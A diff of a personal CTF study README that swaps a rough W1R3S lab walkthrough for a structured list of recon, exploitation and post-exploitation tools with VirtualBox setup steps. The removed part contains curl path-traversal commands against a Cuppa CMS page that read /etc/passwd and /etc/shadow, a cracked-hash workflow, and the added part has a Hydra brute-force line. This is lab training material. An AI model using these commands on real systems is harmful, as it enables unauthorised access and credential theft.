@@ -1,123 +1,153 @@
 
-# CTF 30 days or 30 maq VM to hacker.
-Playlist
-https://www.youtube.com/watch?v=xnCS8fYfrjs&list=PLHBDBcFA_l_WBcUJWf8cp5BaPsUkquRQU
 
-## Virtual Box Setupt : Creating your virtual network lab 
+# CTF 30 Days or 30 VM Machines to Hack
+**Playlist**: If you want Walkthroughs, here is the creator responsible for the challenge. All credits go to them:  
+[Watch the playlist here](https://www.youtube.com/watch?v=xnCS8fYfrjs&list=PLHBDBcFA_l_WBcUJWf8cp5BaPsUkquRQU)
 
-- Tolls => Properties => NATNetworks
-General Options:
-Name: <VMnet8> 'Created a name for your network'
-IPv4 Prefix: 10.10.10.0/24 'Conf. address rang'
-Apply.
+This is not a **Walkthrough** or step-by-step guide. It's just a documentation that directs you on how to proceed, highlighting the logic behind CTF challenges or potential errors and obstacles. It helps adapt to personal needs and carve your own path, creating a mental map of the process.  
 
-## Parrot / Kali et. 
-- Settings => Network
-Adpter 1 => Enable Network Adapter:
-Attached to: Nat Network
-Name: VMnet8 'The Network you created'
-Adpter Type: choose your adpter.
-Promiscuous Mode: Deny ' Just allow if you might to test wifi-network'
-check Cable Connected.
-Ok.
-You need to settup all VM for this lab the same 'NAT'your criate. 
-Read morde About natwork on VM.
+Additionally, you'll find options for alternative tools and a brief description of each one used. Every issue or obstacle I face will be documented here for reference.  
 
-- https://www.nanoshots.com.br/2015/08/virtualbox-configurando-o-acesso-ssh.html
-- https://www.virtualbox.org/manual/ch06.html
+It's still messy, and I don't know if or when I'll tidy it up. But here it is—I hope it helps you somehow.
 
-- Find Target on your VM 'Attacker'
+---
 
-# !!! Click Connection Informatio on icon Network or use ifconfig !!! You see your IP and ranger, in my case I configured to 10.10.10.0/24
+## VirtualBox Setup: Creating Your Virtual Network Lab
+1. Navigate to **Tools → Properties → NATNetworks**.  
+   Configure as follows:
+   - **Name**: `<VMnet8>` (Create a name for your network)
+   - **IPv4 Prefix**: `10.10.10.0/24` (Set address range)
+   - Click **Apply**.
 
-- Nmap -sn <10.10.10.0/24>
-- fping -a -g <10.10.10.0/24>
- -a (activi) -g (ranger)
-- arp-scan --localnet
-- netdiscover -r <10.10.10.0/24>
-- nbtscan -r <10.10.10.0/24>
-  
+### Parrot / Kali (and other VMs)
+2. Configure your VM:
+   - **Settings → Network**  
+     - **Adapter 1**: Enable Network Adapter  
+       - **Attached to**: NAT Network  
+       - **Name**: VMnet8 (The network you created)  
+       - **Adapter Type**: Select your adapter.  
+       - **Promiscuous Mode**: Deny (Enable only if testing WiFi networks).  
+       - Check **Cable Connected**.  
+   - Click **OK**.
 
+Ensure all VMs in this lab are set to the same NAT network.  
+For more about NAT networks in VirtualBox:  
+- [NanoShots Guide](https://www.nanoshots.com.br/2015/08/virtualbox-configurando-o-acesso-ssh.html)  
+- [VirtualBox Manual](https://www.virtualbox.org/manual/ch06.html)  
 
-## Documentação das etapas de resolução do CTF ##
+---
 
-## 05 w1r3s
+## Identifying Target in Your VM (Attacker)
+Click the **Network Connection Information icon** or use `ifconfig` to see your IP and range.  
+Example configuration: `10.10.10.0/24`.  
 
-1. Reconnaissance (Recon)
-Perform an Nmap scan to identify open ports.
-Command Examples:
-bash
+Use one of the following tools to identify active hosts:  
+- `nmap -sn 10.10.10.0/24`  
+- `fping -a -g 10.10.10.0/24`  
+  - `-a`: Show active hosts  
+  - `-g`: Specify range  
+- `arp-scan --localnet`  
+- `netdiscover -r 10.10.10.0/24`  
+- `nbtscan -r 10.10.10.0/24`  
 
-nmap -sV -v -Pn <host>  
-nmap -sC -A -p- -Pn <host>  
-Scan Results:
-bash
+---
 
+## Workflow Stages & Tools
 
+### 1. Setup Instructions
+Tools Used:
+- **VirtualBox** or **VMware**: To create virtual machines.  
+- **NAT Network Configuration**: For seamless interaction between local and virtual machines.  
+- **File Sharing Tools**: WinSCP or Samba for transferring files.  
+- **Traffic Analysis Tools**: Wireshark for capturing and analyzing packets.  
 
+---
 
+### 2. Reconnaissance (Recon)
+Tools Used:
+- **Nmap**: Port scans, service identification, and version detection.  
+- **Masscan**: Rapid network scanning.  
+- **Whois**: Retrieve domain and IP information.  
+- **Sublist3r**: Enumerate subdomains.  
+- **Dnsenum/Dnsmap**: DNS record scans.  
+- **Gobuster/BfExploit**: Directory and file brute-forcing on HTTP servers.  
+- **Nikto**: Web vulnerability scanner.  
+- **Dirb/Dirbuster**: Brute-force tools for directory enumeration.  
 
-***********************************************************
+---
 
-Service Info:  
-- Hosts: The, JOY.localdomain, 127.0.1.1, JOY  
-- OS: Linux  
-- CPE: cpe:/o:linux:linux_kernel
+### 3. Enumeration
+Tools Used:
+- **Hydra**: Brute-force tool for protocols like SSH, FTP, HTTP, etc.  
+- **Nikto**: Web scanner for detecting application vulnerabilities.  
+- **Nmap Scripts** (`-sC`): Service enumeration and vulnerability detection.  
+- **Gobuster/Dirbuster**: Directory and file scanning.  
+- Protocol brute-forcing examples:  
+  - **FTP**: `hydra -l username -P password_list ftp://target`  
+  - **SNMP**: `snmpwalk -v1 -c community_target 192.168.0.1`  
 
-***********************************************************
-  
-2. Enumeration
-FTP Enumeration
-FTP allows anonymous login.
-Search for files in the FTP directory for anything useful.
-Files Found:
-diff
-//////////////////
-dirb / gobuster / nikto
+---
 
-http://10.10.10.12/administrator/installation/
-Files Found:
-Cuppa CMS
+### 4. Vulnerability Identification
+Tools Used:
+- **Metasploit Framework**: Exploiting known vulnerabilities.  
+- **CVE Exploits Database**: To find suitable exploits.  
+- **SQLmap**: For SQL injection exploitation.  
+- **Nessus/OpenVAS**: Vulnerability scanners.  
+- **Wireshark**: Analyzing network traffic.  
+- **Burp Suite**: Web vulnerability analysis (e.g., XSS, CSRF).  
+- **Metasploit Auxiliary Modules**: Port and service scanners.  
 
-********************************
-searchsploit cuppa 
-locate  past path.
-cat <paht>
+---
 
+### 5. Exploitation
+Tools Used:
+- **Metasploit Framework**: For exploitation modules like ProFTPD vulnerabilities.  
+- **MS17-010 Exploit** (EternalBlue): Exploit SMB vulnerabilities.  
+- **Empyre/Empire**: C2 frameworks for remote shell management.  
+- **Veil-Evasion**: Create payloads to bypass detection.  
+- **Powersploit**: PowerShell scripts for exploitation.  
+- **Netcat (nc)**: Interaction with services.  
 
+---
 
+### 6. Privilege Escalation
+Tools Used:
+- **LinPEAS/WinPEAS**: Identify misconfigurations and permissions.  
+- **GTFOBins**: Commands for privilege escalation on Linux.  
+- **SUID3dump**: Find SUID binaries.  
+- **Impacket**: Tools for lateral movement in Windows environments.  
+- **Mimikatz**: Extract credentials and hashes.  
 
+---
 
+### 7. Post-Exploitation
+Tools Used:
+- **Metasploit Meterpreter**: Interactive remote shell.  
+- **Cobalt Strike**: C2 Framework for automation.  
+- **Mimikatz**: Credential extraction.  
+- **Rubeus**: Kerberos ticket extraction.  
+- **Ncat (nc)**: Persistent connections and data exfiltration.  
 
+---
 
+### 8. Flag Collection
+Tools Used:
+- **Cat**: Display text file contents.  
+- **Find**: Locate relevant files.  
+- **Strings**: Extract readable strings from binaries.  
+Example Commands:  
+- `cat /root/flag.txt`  
+- `strings /usr/bin/flag_binary`  
 
-4. Exploiting 
+---
 
+### 9. Conclusion
+- Summarize your successful exploitation process.  
+- Document lessons learned and effective tools/techniques.  
 
-
-# curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.10.12/administrator/alerts/alertConfigField.php?
-
-# curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://10.10.10.12/administrator/alerts/alertConfigField.php?
-
-search for pwd.
-
-copy 
-w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
-vi <wires>
-john wires.
-
-
-ssh <usr>@<host>
-
-sudo -l
-
-root
-4. Privilege Escalation
-Dont need
-
-
-root  
-
+---  
+**Happy hacking!** 🎯  
 
 
 
